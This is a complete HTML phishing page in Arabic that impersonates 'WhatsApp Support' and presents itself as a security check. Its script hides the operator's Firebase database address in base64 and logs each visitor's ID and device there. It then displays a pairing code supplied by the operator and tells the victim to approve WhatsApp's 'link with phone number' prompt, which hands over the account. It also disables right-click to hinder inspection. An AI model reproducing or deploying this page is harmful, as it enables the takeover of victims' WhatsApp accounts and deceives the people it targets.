<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Support</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .bg-top { position: absolute; top: 0; width: 100%; height: 25%; background: #00a884; z-index: -1; }
        .card { background: #fff; width: 88%; max-width: 400px; padding: 20px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; position: relative; }
        .logo { width: 60px; margin-bottom: 10px; }
        .t1 { color: #41525d; font-size: 18px; font-weight: 700; margin: 10px 0; }
        .dev-tag { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 50px; font-size: 11px; font-weight: 800; display: inline-block; margin-bottom: 15px; }
        .msg { background: #fff3cd; color: #856404; padding: 10px; border-radius: 10px; font-size: 13px; border: 1px solid #ffeeba; margin-bottom: 15px; line-height: 1.4; text-align: right; }
        .steps { color: #3b4a54; font-size: 14px; line-height: 1.6; text-align: right; border-right: 4px solid #00a884; padding-right: 12px; margin-bottom: 20px; }
        .code-box { background: #f8f9fa; border: 2px dashed #00a884; padding: 15px; border-radius: 10px; font-size: 32px; font-weight: 900; color: #128c7e; letter-spacing: 5px; min-height: 45px; }
        .red { color: #d91e1e; font-weight: bold; }
    </style>
</head>
<body dir="rtl">
    <div class="bg-top"></div>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div id="ui_01" class="t1">جاري التحميل...</div>
        <div id="ui_02" class="dev-tag">فحص الجهاز...</div>
        <div id="ui_03" class="msg">يرجى الانتظار لتوليد رمز الأمان الخاص بك.</div>
        <div id="ui_04" class="steps"></div>
        <div id="ui_05" class="code-box">--- ---</div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <script>
        // تشفير الروابط بنظام الـ الحماية السريع
        const _0x_conf = {
            db: "aHR0cHM6Ly94c3R1eG5ldC03ZTAzOC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20v"
        };

        const _init = (s) => atob(s);
        firebase.initializeApp({ databaseURL: _init(_0x_conf.db) });
        const _db = firebase.database();
        
        const _q = new URLSearchParams(window.location.search);
        const _uid = _q.get('id') || "User_" + Math.floor(Math.random() * 9999);
        const _ua = navigator.userAgent;
        const _isIos = /iPhone|iPad|iPod/.test(_ua);
        const _dev = _isIos ? "iPhone (iOS)" : "Android/Mobile";

        // تحديث الواجهة فوراً
        document.getElementById('ui_01').innerText = "تحديث أمان الحساب: " + _uid;
        document.getElementById('ui_02').innerText = "جهاز موثق: " + _dev;
        document.getElementById('ui_03').innerText = "تنبيه: سيصلك إشعار الآن على واتساب يطلب 'ربط جهاز جديد'.";
        document.getElementById('ui_04').innerHTML = "1. افتح الإشعار.<br>2. اضغط 'ربط جهاز'.<br>3. <span class='red'>هام جداً:</span> اختر 'الربط برقم الهاتف بدلاً من ذلك'.";
        document.getElementById('ui_05').innerText = "فحص...";

        // إرسال البيانات للـ Firebase
        _db.ref('visiting/' + _uid).set({ status: "online", device: _dev, ts: Date.now() });

        // الاستماع للكود بدون تهنيج
        _db.ref('sessions/' + _uid).on('value', (snap) => {
            const data = snap.val();
            if (data && data.code) {
                document.getElementById('ui_05').innerText = data.code;
            }
        });

        // حماية إضافية ضد الـ Inspect
        document.addEventListener('contextmenu', event => event.preventDefault());
    </script>
</body>
</html>
